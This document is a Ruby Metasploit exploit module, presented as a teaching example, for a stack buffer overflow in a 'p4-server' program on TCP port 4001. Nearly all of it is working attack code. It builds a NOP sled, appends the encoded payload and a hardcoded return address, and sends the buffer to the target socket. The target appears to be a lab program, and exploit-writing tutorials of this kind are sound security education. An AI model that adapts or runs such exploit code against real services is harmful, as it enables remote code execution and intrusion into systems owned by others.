##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class MetasploitModule < Msf::Exploit::Remote
  Rank = NormalRanking
  include Msf::Exploit::Remote::Tcp

  def initialize(info={})
    super(update_info(info,
      'Name'           => "P4-Server Bufferoverflow (Example-Module)",
      'Description'    => %q{
        This is a basic exploit to show how to write an msf module. 
        Our target application is the p4-server.c which has a simple bufferoverflow vulnerability.
      },
      'License'        => MSF_LICENSE,
      'Author'         => [ 'Strider' ],
      'References'     => [ ['URL', 'http://example.com/blog.php?id=123'] ],
      'Platform'       => 'linux',
      'Targets'        =>
        [
          [ 'P4-Server - 1.0',
            {
              'Ret' => 0xffffc2f0
            }
          ]
        ],
      'Payload'        =>
        {
          'BadChars' => "\x00"
        },
      'Privileged'     => false,
      'DisclosureDate' => "",
      'DefaultTarget'  => 0))

    register_options(
      [
        Opt::RPORT(4001),
        OptAddress.new('RHOST', [ true, 'Set an IP', '' ])
      ])
  end

  def check
    # For the check command
  end

  def exploit
    buf = "\x90" * (1040 - 4 - payload.encoded.length)
    buf += payload.encoded
    buf += [ target.ret ].pack('V')
    print_status("Connecting...")
    connect
    sock.puts(buf)
    print_status("Disconnecting...")
    disconnect
  end

end
